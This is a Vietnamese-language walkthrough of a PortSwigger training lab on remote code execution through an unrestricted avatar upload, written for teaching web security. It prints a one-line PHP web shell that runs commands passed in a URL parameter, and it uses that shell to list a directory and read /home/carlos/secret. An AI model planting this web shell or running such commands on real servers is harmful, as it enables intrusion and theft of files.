## 1. Thông tin bài lab
- Tên lab: **Remote code execution via web shell upload**
- Loại lỗ hổng: File upload -> RCE (Remote Code Execution)
- Link bài lab: [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
- **Mục tiêu**: Upload webshell vào thư mục thực thi mã PHP, chiếm quyền điều khiển server và đọc nội dung tệp tin bí mật _**/home/carlos/secret**_
## 2. Phân tích ban đầu
**Chức năng ứng dụng:** 
- Sau khi đăng nhập tài khoản người dùng, người dùng có thể update email, upload ảnh avatar của người dùng.

img

- Sau khi upload, ứng dụng thông báo đã upload thành công và đường dẫn lưu file ảnh upload.

img

-	Thử truy cập file ảnh đã upload theo đường dẫn từ response nhưng không truy cập được file ảnh

img

-	Thử nghiệm trên một số đường dẫn khác

img

- Ta có thể truy cập đến file ảnh đã upload theo đường dẫn _**/files/avatars/test.png**_

  img

**Đặt giả thuyết**
-	Kiểm tra xem liệu ta có thể upload và thực thi một file php bằng cách tạo một file tên test.php với nội dung <?php phpinfo(); ?> và upload lên server.

img

**Kiểm tra giả thuyết**
-	Sử dụng phương thức GET để truy cập đến file test.php, ta có thể thấy trang web đã thực thi file php mà ta đã upload. Qua đó, ta có thể tạo một web shell để RCE và đọc nội dung tệp tin bí mật.

img

## 3. Tiến hành khai thác
- Tạo một file tên _shell.php_ với nội dung là đoạn code php:

```<?php echo system($_GET['x']) ?>```

Đoạn code cho phép thực thi câu lệnh hệ thống, trong đó x là tham số ta có thể truyền vào qua URL.

img

-	Gói tin Response thông báo upload file shell.php thành công:

img

- Sử dụng phương thức GET và truyền vào tham số `x=ls` để liệt kê các file trong thư mục _**/files/avatars**_
-	Ta thấy có thể truyền lệnh ls và server có thể thực hiện theo ý của ta. 

img

-	Tiếp tục truyền tham số `x=cat /home/carlos/secret` thông qua Burp Suite để đọc nội dung file.
-	Khi gửi gói tin, ta gặp lỗi Bad Request, thử lại trên trình duyệt.

img

-	Khi ta thử lại trên trình duyệt, ta đã đọc được nội dung file bí mật

img

**Chú ý:** Khi truyền tham số trên trình duyệt, ta có thể thấy URL trên trình duyệt đã tự động mã hóa _“khoảng trống”_ thành _%20_. Thử lại trên Burp Suite thì có thể đọc được nội dung của file bí mật.

img














